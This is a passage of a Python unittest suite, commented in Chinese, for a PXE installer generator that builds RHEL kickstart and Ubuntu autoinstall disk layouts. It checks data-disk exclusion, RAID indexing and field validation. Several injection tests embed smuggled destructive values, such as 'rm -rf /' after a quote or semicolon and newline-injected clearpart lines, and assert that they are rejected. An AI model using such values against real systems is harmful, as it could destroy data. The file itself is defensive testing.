        kw.setdefault("mirror", "http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        return _cfg(disk_config=dc, **kw)

    def test_rhel_auto_excludes_data_disks_and_hardcodes_no_target(self):
        dc = {"target": {"mode": "auto"}, "layout": "custom",
              "partitions": CUSTOM_PARTS,
              "data_disks": [{"name": "sdb", "size": "20G", "fstype": "xfs"}]}
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        # §5.42：排除集只认稳定属性（这里 = 20G），**不再是设备名**
        self.assertIn("-v dm='s21474836480'", ks)
        self.assertIn("dmatched(L)", ks)
        self.assertNotIn("-v excl=", ks)          # 按名字排除的旧写法彻底消失
        self.assertNotIn("excluded(nm)", ks)
        # 目标盘依旧不写死（反向断言）。注意 sdb 只出现在注释里（数据盘备注），
        # **不能**出现在任何选盘/分区指令里 —— 那才是"写死盘名"。
        self.assertNotIn("--ondisk=sdb", ks)
        self.assertNotIn("clearpart --drives=sdb", ks)
        self.assertIn("clearpart --drives=$target --all --initlabel", ks)
        # %pre 选不到盘时必须中止，绝不"随便挑一块"
        self.assertIn("未找到可用的目标磁盘，装机中止", ks)
        # §5.42：声明了数据盘却一块都没命中时也必须中止（排除集为空 = 会抹掉数据盘）
        self.assertIn("拒绝继续", ks)

    def test_exclusion_uses_stable_matchers_not_device_names(self):
        """排除集只能来自 data_disks，且**只认稳定属性**（size/serial/wwid），不认设备名。

        为什么（§5.42，真机三台并发实测，数据丢失级）：`sdX` 由内核探测顺序决定。
        同一套虚机配置（scsi0=30G 数据盘、scsi1=20G 系统盘）在 VM143 上被枚举成
        scsi0→sdb、scsi1→sda，与 VM142/VM144 正好相反，且同一台机器两次启动都不一样。
        用名字做排除集，排掉的就是**系统盘**，target 落到数据盘上，clearpart 把它抹了
        （三台里中一台）。另外 RAID 成员的盘名前缀**不能**进排除集 —— 那是目标盘上的
        分区（_raid_part_ref），前缀进去会把目标盘自己排除掉、导致选不到盘。
        """
        from app.it.pxe.generator import _data_disk_matcher_specs, _disk_plan
        dc = {"target": {"mode": "match", "serial": "S3Z1NB0K123456"},
              "layout": "custom",
              "partitions": [{"mount": "/boot/efi", "size": "512M"},
                             {"size": "10G", "fstype": "xfs"},
                             {"size": "10G", "fstype": "xfs"},
                             {"mount": "/", "size": "rest"}],
              "raid": [{"name": "md0", "level": 1, "devices": ["sdb2", "sdb3"],
                        "mount": "/data", "fstype": "xfs"}],
              "data_disks": [{"size": "30G", "fstype": "xfs"}]}
        plan = _disk_plan(self._rhel(dc), dc)
        self.assertEqual(plan["raid"][0]["member_indexes"], [1, 2])
        self.assertEqual(_data_disk_matcher_specs(plan), [["s%d" % (30 * 1024 ** 3)]])
        ks = generate_all(self._rhel(dc))["ks.cfg"]
        self.assertIn("-v dm='s32212254720'", ks)
        self.assertNotIn("excl=", ks)                  # 按名字排除的旧写法彻底消失
        self.assertNotIn("excluded(", ks)              # 旧的 excluded() 函数也没了
        # §5.42 要求"相关日志要记录"：磁盘清单/命中数/最终 target 必须打到串口
        self.assertIn("PXE-DISK:", ks)
        self.assertIn("/dev/console", ks)
        self.assertIn("PXE-DISK: 命中数据盘", ks)

    def test_name_only_data_disk_is_rejected_and_matchers_normalize(self):
        """§5.42：只给设备名的数据盘必须**拒绝生成**；稳定匹配串要正确归一化。"""
        from app.it.pxe.generator import _data_disk_matcher_specs, _size_to_bytes
        self.assertEqual(_size_to_bytes("30G"), 30 * 1024 ** 3)     # 裸 G = 二进制
        self.assertEqual(_size_to_bytes("30GB"), 30 * 1000 ** 3)    # 显式 GB = 十进制
        self.assertEqual(_size_to_bytes("512M"), 512 * 1024 ** 2)
        self.assertEqual(_size_to_bytes("32212254720"), 32212254720)
        # size + serial：两个条件取"或"（多排除只让候选集变小 → 最终中止，是安全方向）
        self.assertEqual(
            _data_disk_matcher_specs({"data_disks": [{"size": "20G", "serial": "ABC123"}]}),
            [["s21474836480", "nABC123"]])   # 分组：一个声明一组，组内取或
        # 只给名字 → 拒绝，且提示里必须告诉用户改用 size/serial/wwid
        with self.assertRaises(ValueError) as ctx:
            _data_disk_matcher_specs({"data_disks": [{"name": "sda"}]})
        self.assertIn("size", str(ctx.exception))
        self.assertIn("设备名", str(ctx.exception))
        # serial/wwid 会被拼进 %pre 的 shell/awk 字符串 → 注入面必须堵住
        for bad in ("a'; rm -rf / #", "a b", 'a"b', "a$b"):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    _data_disk_matcher_specs({"data_disks": [{"serial": bad}]})
        # 声明了数据盘时，%pre 必须**逐个声明**校验命中，未命中就中止。
        ks = generate_all(self._rhel({"target": {"mode": "auto"}, "layout": "custom",
                                      "partitions": CUSTOM_PARTS,
                                      "data_disks": [{"size": "30G"}]}))["ks.cfg"]
        self.assertIn("拒绝继续", ks)
        self.assertIn("exit 1", ks)
        # 判据必须是 awk 的**退出码**，不能把数字回声出来再 `[ -eq 0 ]`：
        # 输出为空/非数字时 `[ "" -eq 0 ]` 会报错并让 if 判假 → 护栏失效（fail-open）。
        self.assertIn("if ! lsblk", ks)
        self.assertNotIn('"${_dmcnt}" -eq 0', ks)
        self.assertIn("set -o pipefail", ks)
        # 逐声明（按组）统计，而不是只统计"命中了几块盘"：
        # 只数总数的话，"声明两块只命中一块"会放行，没命中的那块数据盘就成了目标盘。
        self.assertIn("第 %d 个数据盘声明一块都没命中", ks)

    def test_lsblk_is_parsed_by_key_not_by_column(self):
        """缺陷 #4：%pre 用 -P/--pairs 按 key 取值，不再按下标取列。

        旧写法 `$2=="disk" && $3=="0" && $4!="usb" && $5>=N` 在任何一列为空时整体左移：
        TRAN 为空（virtio-blk 实测）会让 $5 变成空串、下限比较恒假 → 一块盘都选不出来；
        反过来 SIZE 为空时 $5 会取到别的字段，可能选中**错误**的盘再 clearpart。
        """
        ks = generate_all(self._rhel({"target": {"mode": "auto"}, "layout": "custom",
                                      "partitions": CUSTOM_PARTS}))["ks.cfg"]
        self.assertIn("lsblk -bdnP -o NAME,TYPE,RM,TRAN,SIZE", ks)
        for positional in ('$2==', '$3==', '$4!=', '$5>='):
            self.assertNotIn(positional, ks)
        self.assertIn('gv(L, "TYPE") != "disk"', ks)
        self.assertIn('gv(L, "TRAN") == "usb"', ks)     # 空 TRAN 不再让列塌陷
        self.assertIn('gv(L, "RM") != "0"', ks)
        self.assertIn('gv(L, "SIZE") + 0 < min', ks)
        # match 模式同样按 key 取值（MODEL 可能带空格，位置取值必然取错）
        ks2 = generate_all(self._rhel({"target": {"mode": "match",
                                                  "serial": "S3Z1NB0K123456"}}))["ks.cfg"]
        self.assertIn("lsblk -dnP -o NAME,SERIAL,MODEL", ks2)
        self.assertIn('gv(L, "SERIAL") == s', ks2)
        self.assertNotIn('$2==s', ks2)

    def test_ubuntu_noncustom_auto_with_data_disks_is_rejected(self):
        """Ubuntu 的 layout.match 没有排除语法 → 必须拒绝，绝不猜一块盘然后 wipe 掉它。"""
        _assert_disk_config_rejected(
            self, {"target": {"mode": "auto"}, "layout": "lvm",
                   "data_disks": [{"name": "sdc", "size": "30G"}]}, "data_disks", os_type="ubuntu")
        # RHEL 侧同一形状**不能**跟着报错：它的 %pre 能表达排除。
        # §5.42：排除靠稳定属性（这里 size=30G），不再靠设备名。
        ks = generate_all(self._rhel({"target": {"mode": "auto"}, "layout": "lvm",
                                      "data_disks": [{"name": "sdc", "size": "30G"}]}))["ks.cfg"]
        self.assertIn("-v dm='s32212254720'", ks)
        self.assertNotIn("-v excl=", ks)


class PxeDataDiskTest(unittest.TestCase):
    """缺陷 #1/#5：data_disks 的每个字段都要么被生成、要么被 422 拒绝，绝不静默丢弃。"""

    def _rhel(self, dc, **kw):
        kw.setdefault("os_type", "rhel")
        kw.setdefault("os_version", "9")
        kw.setdefault("mirror", "http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        return _cfg(disk_config=dc, **kw)

    WIPE_DD = {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
               "partitions": CUSTOM_PARTS,
               "data_disks": [{"name": "sdc", "size": "30G", "mount": "/backup",
                               "fstype": "xfs", "wipe": True}]}

    def test_ubuntu_custom_generates_data_disk(self):
        """Ubuntu custom 侧原本完全不生成数据盘（mount 被静默丢掉）—— 现在真的生成。"""
        cfg = yaml.safe_load(generate_all(_cfg(disk_config=self.WIPE_DD))["user-data"])[
            "autoinstall"]["storage"]["config"]
        self.assertEqual([c for c in cfg if c["type"] == "disk"], [
            {"type": "disk", "id": "disk0", "path": "/dev/sda", "wipe": "superblock",
             # §5.46：grub_device 必需（漏了会报 did not create needed bootloader
             # partition）；有 ESP 用 gpt，没有则 msdos(与 RHEL 侧 MBR 一致)
             "grub_device": True, "ptable": "gpt"},
            {"type": "disk", "id": "data0", "path": "/dev/sdc", "wipe": "superblock"},
        ])
        # ★ 外部审查 U1-F1：数据盘分区原来发的是字符串 "rest" —— subiquity 会报
        #   `'rest' is not valid input.` 整机中止，而此时 curtin 已经把数据盘
        #   wipe:"superblock" 抹掉了（先抹后失败）。主盘/LVM 早就转成 -1 了，这里漏了。
        self.assertIn({"type": "partition", "id": "datap0", "device": "data0",
                       "size": -1}, cfg)
        self.assertNotIn("rest", json.dumps(cfg))
        fmt = [c for c in cfg if c["type"] == "format" and c["volume"] == "datap0"]
        self.assertEqual(len(fmt), 1)
        self.assertEqual(fmt[0]["fstype"], "xfs")
        self.assertEqual([(c["device"], c["path"]) for c in cfg if c["type"] == "mount"][-1],
                         (fmt[0]["id"], "/backup"))

    def test_rhel_custom_generates_data_disk(self):
        """显式盘名（mode=name）时磁盘行直接输出在主体里，不在 %pre 片段中。"""
        block = _ks_disk_block(generate_all(self._rhel(self.WIPE_DD))["ks.cfg"])
        self.assertIn("clearpart --drives=sda,sdc --all --initlabel", block)
        self.assertIn("part /backup --fstype=xfs --size=1 --grow --ondisk=sdc", block)

    def test_data_disk_mount_without_wipe_is_rejected(self):
        """wipe=false + mount：不会给"不许动"的盘建分区，挂载点兑现不了 → 拒绝（旧行为是静默丢弃）。"""
        _assert_disk_config_rejected(
            self, {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
                   "partitions": CUSTOM_PARTS,
                   "data_disks": [{"name": "sdc", "size": "30G", "mount": "/backup", "fstype": "xfs"}]},
            "data_disks[0].mount")

    def test_data_disk_mount_or_wipe_on_noncustom_layout_is_rejected(self):
        for dd, needle in (({"name": "sdc", "size": "30G", "mount": "/backup"}, "data_disks[0].mount"),
                           ({"name": "sdc", "size": "30G", "wipe": True}, "data_disks[0].wipe=true")):
            with self.subTest(dd=dd):
                _assert_disk_config_rejected(
                    self, {"target": {"mode": "name", "name": "sda"}, "layout": "lvm",
                           "data_disks": [dd]}, needle)

    def test_partitions_on_noncustom_layout_is_rejected(self):
        _assert_disk_config_rejected(
            self, {"layout": "lvm", "partitions": [{"mount": "/", "size": "rest"}]},
            "partitions")

    def test_raid_on_noncustom_layout_is_rejected(self):
        _assert_disk_config_rejected(
            self, {"layout": "direct",
                   "raid": [{"name": "md0", "level": 1, "devices": ["part.01"]}]},
            "raid")

    def test_partition_both_pv_and_raid_is_rejected(self):
        _assert_disk_config_rejected(
            self, {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
                   "partitions": [{"mount": "/boot/efi", "size": "512M"},
                                  {"mount": "swap", "size": "4G"},
                                  {"vg": "vg0", "lv": "root", "mount": "/", "size": "rest"}],
                   "raid": [{"name": "md0", "level": 1, "devices": ["part.03"],
                             "mount": "/data", "fstype": "xfs"}]},
            "partitions[2]")

    def test_custom_layout_without_root_mount_is_rejected(self):
        _assert_disk_config_rejected(
            self, {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
                   "partitions": [{"mount": "/boot/efi", "size": "512M"},
                                  {"mount": "/boot", "size": "1G"}]},
            "/boot/efi")

    def test_duplicate_mount_is_rejected(self):
        _assert_disk_config_rejected(
            self, {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
                   "partitions": [{"mount": "/boot/efi", "size": "512M"},
                                  {"mount": "/data", "size": "10G"},
                                  {"mount": "/data", "size": "20G"},
                                  {"mount": "/", "size": "rest"}]},
            "partitions[2].mount")

    def test_duplicate_vg_lv_is_rejected(self):
        _assert_disk_config_rejected(
            self, {"layout": "custom",
                   "partitions": [{"vg": "vg0", "lv": "root", "mount": "/", "size": "20G"},
                                  {"vg": "vg0", "lv": "root", "mount": "/var", "size": "rest"}]},
            "partitions[1].lv")

    def test_duplicate_data_disk_name_is_rejected(self):
        _assert_disk_config_rejected(
            self, {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
                   "partitions": CUSTOM_PARTS,
                   "data_disks": [{"name": "sdc", "size": "20G"},
                                 {"name": "sdc", "size": "21G"}]},
            "data_disks[1].name")

    def test_duplicate_raid_name_is_rejected(self):
        _assert_disk_config_rejected(
            self, {"layout": "custom",
                   "partitions": [{"mount": "/boot/efi", "size": "512M"},
                                  {"size": "1G", "fstype": "xfs"},
                                  {"size": "1G", "fstype": "xfs"},
                                  {"mount": "/", "size": "rest"}],
                   "raid": [{"name": "md0", "level": 1, "devices": ["part.02"]},
                            {"name": "md0", "level": 1, "devices": ["part.03"]}]},
            "raid[].name")

    def test_raid_member_disk_prefix_must_not_be_a_data_disk(self):
        """`sdc3` 的 sdc 若同时被声明成数据盘 = 自相矛盾（想在这块盘上做 RAID，又说不许碰）。"""
        _assert_disk_config_rejected(
            self, {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
                   "partitions": [{"mount": "/boot/efi", "size": "512M"},
                                  {"size": "10G", "fstype": "xfs"},
                                  {"mount": "/", "size": "rest"}],
                   "raid": [{"name": "md0", "level": 1, "devices": ["sdc2"],
                             "mount": "/data", "fstype": "xfs"}],
                   "data_disks": [{"name": "sdc", "size": "30G"}]},
            "raid[0].devices")


class PxeRaidIdSpellingTest(unittest.TestCase):
    """缺陷 #3：三种 RAID 成员写法（part.NN 1 起 / partN 0 起 / 盘名N 1 起）的基准必须等价且单点化。"""

    # (写法, 期望下标)；同一个分区可以有多种写法，它们必须落在同一个下标上
    SAME_PARTITION = ("part.03", "part2", "sdb3", "nvme0n1p3", "mmcblk0p3")
    EXPECTED_INDEX = 2

    def test_each_spelling_resolves_to_the_same_partition(self):
        from app.it.pxe.generator import _raid_part_ref
        from app.core.schemas import _raid_member_index
        for spelling in self.SAME_PARTITION:
            with self.subTest(spelling=spelling):
                idx, disk = _raid_part_ref(spelling, "raid[0].devices")
                self.assertEqual(idx, self.EXPECTED_INDEX, spelling)
                # 两层（schemas 直接复用同一实现）必须给出同一个下标
                self.assertEqual(_raid_member_index(spelling, 5, "raid[0].devices"),
                                 self.EXPECTED_INDEX, spelling)
        # 盘名前缀只用于交叉校验，不改变归属
        self.assertEqual(_raid_part_ref("sdb3", "f")[1], "sdb")
        self.assertEqual(_raid_part_ref("nvme0n1p3", "f")[1], "nvme0n1")
        self.assertEqual(_raid_part_ref("part.03", "f")[1], "")
        self.assertEqual(_raid_part_ref("part2", "f")[1], "")

    def test_bases_are_explicit_and_do_not_drift(self):
        """同一套基准的边界：part.01/part0/sdb1 都是第 1 个分区；part1 是第 2 个（0 起）。"""
        from app.it.pxe.generator import _raid_part_ref
        for spelling in ("part.01", "part0", "sdb1", "sda1"):
            with self.subTest(spelling=spelling):
                self.assertEqual(_raid_part_ref(spelling, "f")[0], 0, spelling)
        # partN 是 subiquity 的 0 起 id ⇒ part1 = 第 2 个分区（与 part.01 不是同一个！）
        self.assertEqual(_raid_part_ref("part1", "f")[0], 1)
        self.assertEqual(_raid_part_ref("part.02", "f")[0], 1)
        self.assertEqual(_raid_part_ref("part.10", "f")[0], 9)   # 0 起 → 第 11 个
        self.assertEqual(_raid_part_ref("part.10", "f")[0], 9)   # 1 起 → 第 10 个
        self.assertEqual(_raid_part_ref("sdb10", "f")[0], 9)     # 1 起 → 第 10 个

    def test_unparsable_spelling_is_rejected_in_both_layers(self):
        _assert_disk_config_rejected(
            self, {"layout": "custom",
                   "partitions": [{"mount": "/", "size": "rest"}],
                   "raid": [{"name": "md0", "level": 1, "devices": ["sdz"]}]},
            "raid[0].devices")

    def test_raid_member_reference_is_checked_at_both_layers(self):
        """越界引用（第 9 个分区而只有 1 个）两层都要拒，且点名字段。"""
        _assert_disk_config_rejected(
            self, {"layout": "custom",
                   "partitions": [{"mount": "/", "size": "rest"}],
                   "raid": [{"name": "md0", "level": 1, "devices": ["part.09"]}]},
            "raid[0].devices")


class PxeUnmountedPartitionTest(unittest.TestCase):
    """缺陷 #6：RHEL 侧"只建分区不挂载"原本会生成 `part part.01 ...`（anaconda 不认识）。"""

    DC = {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
          "partitions": [{"mount": "/boot/efi", "size": "512M"},
                         {"size": "10G", "fstype": "xfs"},       # 只建分区、不挂载
                         {"mount": "/", "size": "rest"}]}

    def test_rhel_rejects_it_with_field_path(self):
        """anaconda/pykickstart 只接受 <mntpoint> ∈ /<path>|swap|raid.<id>|pv.<id>|btrfs.<id>|biosboot。

        证据（本仓库外，源码级）：
          pykickstart/pykickstart/options.py:  mountpoint(value) 只对 "/" 开头做 normpath，其余原样透传
          pykickstart/pykickstart/commands/partition.py: 位置参数 mntpoint 的帮助文本枚举了上面这几种形式
        所以 `part part.01` 不是"无挂载点"，而是把我们的内部标识当成了挂载点 —— 解析能过，
        但 anaconda 会按挂载点处理它。这里直接拒绝，绝不发一条语义不确定的 ks 行。
        """
        with self.assertRaises(ValueError) as cm:
            generate_all(_cfg(os_type="rhel", os_version="9", disk_config=self.DC,
                              mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/"))
        self.assertIn("disk_config.partitions[1].mount", str(cm.exception))
        # PV / RAID 成员仍然照旧（`part pv.01` / `part raid.01` 是 anaconda 认的形式）
        pv_dc = dict(self.DC, partitions=[{"vg": "vg0", "lv": "root", "mount": "/",
                                           "size": "rest"}])
        ks = generate_all(_cfg(os_type="rhel", os_version="9", disk_config=pv_dc,
                               mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/"))["ks.cfg"]
        self.assertIn("part pv.01 ", ks)
        self.assertNotIn("part part.", ks)

    def test_ubuntu_allows_it(self):
        """subiquity 侧"没有挂载点的分区"是合法表达（可以只建分区/只格式化），不能跟着 RHEL 一起拒。"""
        cfg = yaml.safe_load(generate_all(_cfg(disk_config=self.DC))["user-data"])[
            "autoinstall"]["storage"]["config"]
        self.assertIn({"type": "partition", "id": "part1", "device": "disk0",
                       "size": 10737418240}, cfg)
        # 该分区不会被挂载（没有 mount: 条目指向它）
        self.assertEqual([c["path"] for c in cfg if c["type"] == "mount"], ["/boot/efi", "/"])


class PxeDiskConfigApiTest(unittest.TestCase):
    """新增校验在 HTTP 层必须是 422，且 detail 里带**字段路径**（运维/前端要能直接显示）。"""

    @staticmethod
    def _client():
        from fastapi import FastAPI
        from fastapi.testclient import TestClient

        from app.api import pxe as pxe_api
        from app.core.auth import get_current_user
        from app.database import get_db
        app = FastAPI()
        app.include_router(pxe_api.router, prefix="/api/it/pxe")
        app.dependency_overrides[get_current_user] = lambda: {
            "id": "t", "username": "t", "display_name": "t", "role": "admin"}
        # 请求体校验在进入端点函数之前完成，非法 payload 根本走不到 DB —— 这里给个空实现即可
        app.dependency_overrides[get_db] = lambda: None
        return TestClient(app)

    def test_new_validations_return_422_with_field_path(self):
        client = self._client()
        cases = [
            # 缺陷 #2：历史键 disk 是多盘语法的注入面
            ("disk 多盘", {"disk": "sda,sdb"}, ["disk_config", "disk"]),
            # 缺陷 #1：Ubuntu 非 custom + auto + 数据盘
            ("ubuntu auto + data_disks",
             {"target": {"mode": "auto"}, "layout": "lvm",
              "data_disks": [{"name": "sdc", "size": "30G"}]}, "data_disks"),
            # 缺陷 #1：name 与数据盘同名
            ("name 撞数据盘",
             {"target": {"mode": "name", "name": "sda"},
                                      "data_disks": [{"name": "sda", "size": "20G"}]},
             "data_disks[0].name"),
            # 缺陷 #5：非 custom 给 partitions
            ("非 custom 给 partitions",
             {"layout": "lvm", "partitions": [{"mount": "/", "size": "rest"}]},
             "partitions"),
            # 缺陷 #5：同分区既是 PV 又是 RAID 成员
            ("同分区 PV+RAID",
             {"target": {"mode": "name", "name": "sda"}, "layout": "custom",
              "partitions": [{"vg": "vg0", "lv": "root", "mount": "/", "size": "rest"}],
              "raid": [{"name": "md0", "level": 1, "devices": ["part.01"]}]},
             "partitions[0]"),
        ]
        for label, dc, needle in cases:
            with self.subTest(case=label):
                r = client.post("/api/it/pxe/profiles", json={
                    "name": "x", "os_type": "ubuntu", "admin_password": "Test@123",
                    "disk_config": dc})
                self.assertEqual(r.status_code, 422, r.text)
                detail = json.dumps(r.json()["detail"], ensure_ascii=False)
                if isinstance(needle, list):
                    self.assertIn(needle[0], detail, label)
                    self.assertIn(needle[1], detail, label)
                else:
                    self.assertIn(needle, detail, label)

    def test_unparseable_data_disk_size_is_422_at_save(self):
        """R2-L1：解析不了的 size 在**保存模板**（POST /profiles）时就 422，
        detail 点名字段并给出可读写法 —— 不再等"生成配置"才炸。"""
        client = self._client()
        for bad in ("三十G", "30P"):
            with self.subTest(size=bad):
                r = client.post("/api/it/pxe/profiles", json={
                    "name": "x", "os_type": "rhel", "admin_password": "Test@123",
                    "disk_config": {"target": {"mode": "auto"}, "layout": "custom",
                                    "partitions": [{"mount": "/", "size": "rest"}],
                                    "data_disks": [{"size": bad}]}})
                self.assertEqual(r.status_code, 422, r.text)
                detail = json.dumps(r.json()["detail"], ensure_ascii=False)
                self.assertIn("data_disks[0].size 解析不了", detail)
                self.assertIn(bad, detail)


class PxeDiskValidationTest(unittest.TestCase):
    """规格 §4/§6：非法输入必须被拒，且 detail 要点明是哪个字段（含第几个分区）。"""

    BAD = [
        ("非白名单 fstype", {"layout": "custom",
                             "partitions": [{"mount": "/data", "size": "1G", "fstype": "ntfs"}]},
         "partitions[0].fstype"),
        ("rest 不在最后", {"layout": "custom",
                           "partitions": [{"mount": "/", "size": "rest"},
                                          {"mount": "/data", "size": "10G"}]},
         "partitions[0].size"),
        ("/boot/efi 重复", {"layout": "custom",
                            "partitions": [{"mount": "/boot/efi", "size": "512M"},
                                           {"mount": "/boot/efi", "size": "512M"},
                                           {"mount": "/", "size": "rest"}]},
         "/boot/efi"),
        ("有 efi 无 /", {"layout": "custom",
                         "partitions": [{"mount": "/boot/efi", "size": "512M"},
                                        {"mount": "/boot", "size": "1G"}]},
         "/boot/efi"),
        ("raid 引用未定义分区", {"layout": "custom",
                                 "partitions": [{"mount": "/", "size": "rest"}],
                                 "raid": [{"name": "md0", "level": 1, "devices": ["part.09"]}]},
         "raid[0].devices"),
        ("raid level 非法", {"layout": "custom",
                             "partitions": [{"mount": "/", "size": "rest"}],
                             "raid": [{"name": "md0", "level": 3, "devices": ["part.01"]}]},
         "raid[0].level"),
        ("vg 有而 lv 无", {"layout": "custom", "partitions": [{"vg": "vg0", "size": "rest"}]},
         "vg 与 lv"),
        ("lv 有而 vg 无", {"layout": "custom", "partitions": [{"lv": "root", "size": "rest"}]},
         "vg 与 lv"),
        ("data_disks 与目标盘同名", {"target": {"mode": "name", "name": "sda"},
                                     "data_disks": [{"name": "sda", "size": "20G"}]},
         "data_disks[0].name"),
        ("mount 含 ..", {"layout": "custom",
                         "partitions": [{"mount": "/a/../etc", "size": "1G"}]},
         "partitions[0].mount"),
        ("mount 非绝对路径", {"layout": "custom",
                              "partitions": [{"mount": "data", "size": "1G"}]},
         "partitions[0].mount"),
        ("size 非法", {"layout": "custom", "partitions": [{"mount": "/", "size": "10GB"}]},
         "partitions[0].size"),
        ("layout 非法", {"layout": "raid10"}, "layout"),
        ("target.mode 非法", {"target": {"mode": "auto2"}}, "target.mode"),
        ("vg 名带注入字符", {"layout": "custom",
                             "partitions": [{"vg": "vg0;rm -rf /", "lv": "root",
                                             "mount": "/", "size": "rest"}]},
         "partitions[0].vg"),
        # §5.42：数据盘改为"必须给稳定匹配条件"。原来这条测的是"name 为空要报错"，
        # 现在换成新契约下同样会报 data_disks[0].name 的场景 —— wipe=true 时产物里要
        # 显式写到这块盘，所以盘名仍然必填（否则会生成 `ignoredisk --only-use=` 这种残缺行）。
        # 必须给 layout=custom，否则会先撞上"noncustom 下 wipe 会被丢弃"那条校验。
        ("wipe=true 的数据盘仍必须给盘名",
         {"layout": "custom", "partitions": CUSTOM_PARTS,
          "data_disks": [{"size": "30G", "wipe": True}]},
         "data_disks[0].name"),
    ]

    def test_schema_rejects_with_field_pointing_detail(self):
        """第 2 层（HTTP 入口）：422 且 detail 点明字段。"""
        from pydantic import ValidationError

        from app.core.schemas import PxeProfileIn
        for label, dc, needle in self.BAD:
            with self.subTest(case=label):
                with self.assertRaises(ValidationError) as cm:
                    PxeProfileIn(name="x", disk_config=dc)
                msgs = " | ".join(e["msg"] for e in cm.exception.errors())
                locs = " ".join(".".join(str(x) for x in e["loc"]) for e in cm.exception.errors())
                self.assertIn(needle, msgs + " " + locs, label)

    def test_generator_rejects_same_cases(self):
        """第 3 层：绕过 HTTP 直接调 generate_all，同样拦得住。"""
        from app.it.pxe.generator import _disk_plan
        for label, dc, _needle in self.BAD:
            with self.subTest(case=label):
                with self.assertRaises(ValueError):
                    _disk_plan(_cfg(), dc)

    def test_injection_through_new_fields_is_rejected(self):
        """新增字段不得绕过注入防护：换行/控制字符在两层都要拦。"""
        from app.it.pxe.generator import _disk_plan
        nl = chr(10)
        for dc in (
            {"layout": "custom", "partitions": [{"mount": "/data", "size": "1G",
                                                 "fstype": "ext4" + nl + "part evil"}]},
            {"layout": "custom", "partitions": [{"mount": "/data" + nl + "x", "size": "1G"}]},
            {"layout": "custom", "partitions": [{"vg": "vg0" + nl + "x", "lv": "r",
                                                 "mount": "/", "size": "rest"}]},
            {"target": {"mode": "match", "serial": "S3Z" + nl + "boom"}},
        ):
            with self.subTest(dc=str(dc)):
                with self.assertRaises(ValueError):
                    _disk_plan(_cfg(), dc)

    def test_legacy_disk_key_cannot_inject(self):
        """历史键 disk 会被拼进 ks 的 --drives=/--ondisk=：含换行时必须拦住（两层）。"""
        from pydantic import ValidationError

        from app.core.schemas import PxeProfileIn
        nl = chr(10)
        payload = {"disk": "sda" + nl + "clearpart --drives=sdb --all --initlabel"}
        with self.assertRaises(ValidationError):
            PxeProfileIn(name="x", disk_config=payload)
        for os_type, kw in (("ubuntu", {}), ("rhel", {"mirror": "http://m/rocky9/"})):
            with self.subTest(os_type=os_type):
                with self.assertRaises(ValueError):
                    generate_all(_cfg(os_type=os_type, disk_config=payload, **kw))
        # 合法盘名照旧（不误伤）
        ks = generate_all(_cfg(os_type="rhel", mirror="http://m/rocky9/",
                               disk_config={"disk": "vda"}))["ks.cfg"]
        self.assertIn("clearpart --drives=vda --all --initlabel", ks)

    def test_legacy_disk_key_rejects_multi_disk_syntax(self):
        """缺陷 #2：`--drives=` 是逗号分隔的多盘语法。

        disk="sda,sdb" 旧行为会生成 `clearpart --drives=sda,sdb --all --initlabel`，
        把第二块（数据）盘连同分区表一起抹掉。两层都必须拒，且点名字段。
        """
        from pydantic import ValidationError

        from app.core.schemas import PxeProfileIn
        with self.assertRaises(ValidationError) as cm:
            PxeProfileIn(name="x", disk_config={"disk": "sda,sdb"})
        errs = cm.exception.errors()
        blob = " | ".join(e["msg"] for e in errs) + " " + " ".join(
            ".".join(str(x) for x in e["loc"]) for e in errs)
        self.assertIn("disk", blob, blob)
        # 第 3 层：既有路径的校验在生成器里（_disk_plan 对"只有历史键 disk"的配置直接返回 None，
        # 真正净化发生在 _rhel_ks / _ubuntu_user_data 的既有分支），所以这里必须走 generate_all。
        for bad in ("sda,sdb", "sda sdb", "/dev/sda", "sda;sdb", "sda" + chr(10) + "sdb"):
            with self.subTest(bad=bad):
                for os_type, kw in (("ubuntu", {}), ("rhel", {"mirror": "http://m/rocky9/"})):
                    with self.assertRaises(ValueError):
                        generate_all(_cfg(os_type=os_type, disk_config={"disk": bad}, **kw))
        # 合法盘名照旧（不误伤，输出逐字不变）
        ks = generate_all(_cfg(os_type="rhel", mirror="http://m/rocky9/",
                               disk_config={"disk": "vda"}))["ks.cfg"]
        self.assertIn("clearpart --drives=vda --all --initlabel", ks)

    def test_schema_and_generator_whitelists_do_not_drift(self):
        """两层的白名单必须一致（同 _OS_TYPE_ALLOWED 的做法：有测试锁住）。"""
        from app.core import schemas
        from app.it.pxe import generator
        self.assertEqual(set(schemas._DISK_FSTYPE_ALLOWED), set(generator._FSTYPE_ALLOWED))
        self.assertEqual(set(schemas._DISK_LAYOUT_ALLOWED), set(generator._DISK_LAYOUTS))
        self.assertEqual(set(schemas._DISK_MODE_ALLOWED), set(generator._DISK_MODES))
        self.assertEqual(tuple(schemas._RAID_LEVEL_ALLOWED), tuple(generator._RAID_LEVELS))
        self.assertEqual(schemas._DISK_SIZE_PATTERN, generator._SIZE_RE.pattern)
        self.assertEqual(schemas._DISK_MOUNT_RE.pattern, generator._MOUNT_RE.pattern)

    def test_schema_normalizes_but_keeps_legacy_shape(self):
        """disk_config 校验完必须还是普通 dict——它会落进 JSON 列并传给生成器。"""
        from app.core.schemas import PxeProfileIn
        self.assertEqual(PxeProfileIn(name="x").disk_config, {})
        self.assertEqual(PxeProfileIn(name="x", disk_config={}).disk_config, {})
        legacy = PxeProfileIn(name="x", disk_config={"disk": "sda"}).disk_config
        self.assertEqual(legacy, {"disk": "sda"})
        self.assertIsInstance(legacy, dict)
        # 只回填用户真正给过的键，不把默认值灌进去（否则生成器会误判成结构化配置）
        dc = PxeProfileIn(name="x", disk_config={"target": {"mode": "auto"}}).disk_config
        self.assertEqual(dc, {"target": {"mode": "auto"}})

    def test_legacy_shape_still_takes_the_old_path_after_schema(self):
        """前端只发 {disk: 盘名}：过一遍 schema 之后生成物仍与既有路径逐字一致。"""
